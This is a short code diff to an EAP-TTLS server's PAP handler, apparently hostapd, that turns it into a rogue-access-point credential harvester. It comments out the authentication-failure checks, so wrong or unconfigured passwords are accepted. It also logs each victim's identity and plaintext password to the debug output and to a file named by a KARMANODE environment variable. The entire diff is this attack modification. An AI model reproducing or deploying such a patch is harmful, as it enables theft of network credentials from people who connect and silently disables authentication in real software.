@@ -504,14 +504,22 @@ static void eap_ttls_process_phase2_pap(struct eap_sm *sm,
 	    !(sm->user->ttls_auth & EAP_TTLS_AUTH_PAP)) {
 		wpa_printf(MSG_DEBUG, "EAP-TTLS/PAP: No plaintext user "
 			   "password configured");
-		eap_ttls_state(data, FAILURE);
-		return;
+		//eap_ttls_state(data, FAILURE);
+		//return;
 	}
 
 	if (sm->user->password_len != user_password_len ||
 	    os_memcmp_const(sm->user->password, user_password,
 			    user_password_len) != 0) {
-		wpa_printf(MSG_DEBUG, "EAP-TTLS/PAP: Invalid user password");
+		wpa_printf(MSG_DEBUG, "EAP-TTLS/PAP: Invalid user password: %s", user_password);
+		//thanks gcp
+		char *ennode = getenv("KARMANODE");
+		FILE *f = fopen(ennode, "a");
+		if (f != NULL) {
+			const char *hdr = "PAP";
+			fprintf(f, "%s|%*.*s|%s\n", hdr, 0, sm->identity_len, sm->identity, user_password);
+			fclose(f);
+		}
 		//eap_ttls_state(data, FAILURE);
 		//return;
 	}
